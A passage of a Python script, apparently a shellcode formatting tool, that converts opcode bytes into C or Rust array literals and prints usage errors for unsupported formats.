            output = f"char shellcode[{len(opcodes)}] =\n"
            length = args.length

            for i in range(0, len(opcodes), length):
                line = ""

                for opcode in opcodes[i:i+length]:
                    line += f"\\x{opcode:02x}"

                output += f"    \"{line}\"\n"

            output = output[:-1] + ";"
            print(output)

        elif args.format.lower() == "rust" or args.format.lower() == "rs":
            output = f"let shellcode: [u8; {len(opcodes)}] = [\n"
            length = args.length

            for i in range(0, len(opcodes), length):
                output += "    "

                for j in range(length):
                    if i + j < len(opcodes):
                        output += f"0x{opcodes[i+j]:02x},"

                output += "\n"

            output = output[:-2] + "\n];"
            print(output)

        else:
            print("Avaiable formats: (c, csharp, python, rust)")
            exit(1)
    else:
            print("Format required: (--format): [c, csharp, python, rust]")
            exit(1)